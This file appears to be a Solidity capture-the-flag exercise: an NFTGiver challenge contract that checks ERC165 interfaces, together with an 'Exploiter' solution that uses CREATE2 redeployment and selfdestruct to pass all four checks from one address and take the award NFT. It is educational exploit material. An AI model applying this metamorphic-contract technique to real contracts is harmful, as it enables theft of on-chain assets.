//SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import '@openzeppelin/contracts/utils/introspection/ERC165.sol';
import '@openzeppelin/contracts/token/ERC721/ERC721.sol';
import "hardhat/console.sol";

contract Award is ERC721 {
    constructor() ERC721('Award', 'A') {
        _mint(msg.sender, 1337);
    }
}

// NOTE
// The NFTGiver contract does not follow the ERC165 spec properly. It's supposed
// to consist of two calls, one to determine if it is ERC165, then the specific
// protocol. Don't copy this code for production applications.

contract NFTGiver {
    uint256 public constant GAS_LIMIT = 46;
    struct Game {
        bool success1;
        bool success2;
        bool success3;
        bool success4;
    }

    mapping(ERC165 => Game) private passedChallenge;
    bytes4 immutable ERC1155Reciever = 0x4e2312e0;
    bytes4 immutable ERC1363Reciever = 0x88a7ca5c;
    bytes4 immutable ERCRareReciever = 0x13371337;
    bytes4 immutable ERCBadReceiver = 0xdecafc0f;

    ERC721 private award;
    uint256[] private order;

    constructor(ERC721 awardNFT, uint256[] memory _order) {
        award = awardNFT;
        order = _order;
    }

    function _supportsInterface(ERC165 target, bytes4 _interface)
        public
        view
        returns (bool)
    {
        // console.log(" NFTGiver::_supportsInterface()# ",address(target));
        // console.logBytes4(_interface);
        // return target.supportsInterface{gas: GAS_LIMIT}(_interface);
        return target.supportsInterface(_interface);
    }

    // function challenge1(ERC165 target) external {
    //     console.log(" --------------------- Inside challenge 1");
    //     console.log(_supportsInterface(target, ERC1155Reciever));
    //     console.log(!_supportsInterface(target, ERC1363Reciever));
    //     console.log(!_supportsInterface(target, ERCRareReciever));
    //     console.log(!_supportsInterface(target, ERCBadReceiver));
    //     passedChallenge[target].success1 = true;
    //     console.log(" --------------------  ");
    //     console.log(passedChallenge[target].success1,passedChallenge[target].success2,passedChallenge[target].success3,passedChallenge[target].success4);
    //     console.log(" --------------------  ",order.length,order[order.length - 1]);

    //     require(order[order.length - 1] == 1);
    //     order.pop();
    //     console.log(" -------------------- passed challenge 1 ",order.length);
    // }

    function challenge1(ERC165 target) external {
        console.log(" --------------------- Inside challenge 1");
        require(_supportsInterface(target, ERC1155Reciever));
        require(!_supportsInterface(target, ERC1363Reciever));
        require(!_supportsInterface(target, ERCRareReciever));
        require(!_supportsInterface(target, ERCBadReceiver));
        passedChallenge[target].success1 = true;

        console.log(" --------------------  ",order.length,order[order.length - 1]);

        require(order[order.length - 1] == 1);
        order.pop();
        console.log(" -------------------- passed challenge 1 ",order.length);
    }

    function challenge2(ERC165 target) external {
        console.log(" --------------------- Inside challenge 2");
        require(!_supportsInterface(target, ERC1155Reciever));
        require(_supportsInterface(target, ERC1363Reciever));
        require(!_supportsInterface(target, ERCRareReciever));
        require(!_supportsInterface(target, ERCBadReceiver));
        console.log(passedChallenge[target].success1,passedChallenge[target].success2,passedChallenge[target].success3,passedChallenge[target].success4);

        console.log(" --------------------  ",order.length,order[order.length - 1]);
        require(order[order.length - 1] == 2);
        order.pop();

        passedChallenge[target].success2 = true;
        console.log(" -------------------- passed challenge 2 ",order.length);
    }

    function challenge3(ERC165 target) external {
        console.log(" --------------------- Inside challenge 3");
        require(!_supportsInterface(target, ERC1155Reciever));
        require(!_supportsInterface(target, ERC1363Reciever));
        require(_supportsInterface(target, ERCRareReciever));
        require(!_supportsInterface(target, ERCBadReceiver));
        console.log(passedChallenge[target].success1,passedChallenge[target].success2,passedChallenge[target].success3,passedChallenge[target].success4);
        console.log(" --------------------  ",order.length,order[order.length - 1]);

        require(order[order.length - 1] == 3);
        order.pop();

        passedChallenge[target].success3 = true;
        console.log(" -------------------- passed challenge 3 ",order.length);

    }

    function challenge4(ERC165 target) external {
        console.log(" --------------------- Inside challenge 4");
        require(!_supportsInterface(target, ERC1155Reciever));
        require(!_supportsInterface(target, ERC1363Reciever));
        require(!_supportsInterface(target, ERCRareReciever));
        require(_supportsInterface(target, ERCBadReceiver));
        console.log(passedChallenge[target].success1,passedChallenge[target].success2,passedChallenge[target].success3,passedChallenge[target].success4);

        console.log(" --------------------  ",order.length,order[order.length - 1]);

        require(order[order.length - 1] == 4);
        order.pop();

        passedChallenge[target].success4 = true;
        console.log(" -------------------- passed challenge 4 ",order.length);

    }

    // function success(ERC165 target) external {
    //     console.log(" -------------------- Inside success()");

    //     console.log(passedChallenge[target].success1);
    //     console.log(passedChallenge[target].success2);
    //     console.log(passedChallenge[target].success3);
    //     console.log(passedChallenge[target].success4);

    //     delete passedChallenge[target];

    //     require(award.ownerOf(1337) == address(this));
    //     console.log(" -------------------- success() passed checks");
    //     award.transferFrom(address(this), msg.sender, 1337);
    // }
    function success(ERC165 target) external {
        console.log(" -------------------- Inside success()");

        require(passedChallenge[target].success1);
        require(passedChallenge[target].success2);
        require(passedChallenge[target].success3);
        require(passedChallenge[target].success4);

        delete passedChallenge[target];

        require(award.ownerOf(1337) == address(this));
        console.log(" -------------------- success() passed checks");
        award.transferFrom(address(this), msg.sender, 1337);
    }
}


contract DeployInterface{
    constructor(){
        console.log(" --- DeployInterface::()# contract created");
    }

    function deploy(bytes4 interfaceid) external returns (address){
        address t = address(new InterfaceContract(interfaceid));
        console.log(" --- DeployInterface::deploy()# ",t);
        console.logBytes4(interfaceid);
        return t;
    }

    function destroy() public {
        console.log(" --- DeployInterface::~()# destroyed");
        selfdestruct(payable(msg.sender));
    }
}

contract InterfaceContract{
    bytes4 public immutable interfaceid;
    constructor(bytes4 _interfaceid){
        console.log(" --- InterfaceContract::()# created");
        interfaceid = _interfaceid;
    }
    function supportsInterface(bytes4 interfaceId) public view returns (bool) {
        console.log(" --- InterfaceContract::supportsInterface()# ");
        return interfaceId == interfaceid;
    }
    fallback()external{
        console.log(" --- InterfaceContract::fallback()# ");
        // bool status =  abi.decode(msg.data[4:], (bytes4)) == interfaceid;
        bytes4 _interfaceid = interfaceid;
        assembly {
            mstore(0,eq(_interfaceid,shr(0xe0,calldataload(4))))
            return(0,0x20)
        }
    }
    function destroy() public {
        console.log(" --- InterfaceContract::~()# destroyed");
        selfdestruct(payable(msg.sender));
    }
}


contract Exploiter{
    address public _target;
    constructor(){
        console.log(" --- Exploiter::()# created");
    }

    function execute(address victim,bytes4 funcSig,bytes4 ifceId,address award) external {
        console.log("#############################################################");
        // uint id = _order[3 - i];
        DeployInterface deployer = new DeployInterface{salt:0x0}();
        address target = deployer.deploy(ifceId);
        _target = target;
        // console.logBytes4(InterfaceContract(target).interfaceid());
        address(victim).call(abi.encodeWithSelector(funcSig,target));
        InterfaceContract(target).destroy();
        deployer.destroy();
    }

    function callSuccess(address victim,address award )external {

        console.log("Exploiter::callSuccess# ",_target);
        
        NFTGiver(victim).success(ERC165(_target));
        Award(award).transferFrom(address(this), msg.sender, 1337);
    }
}

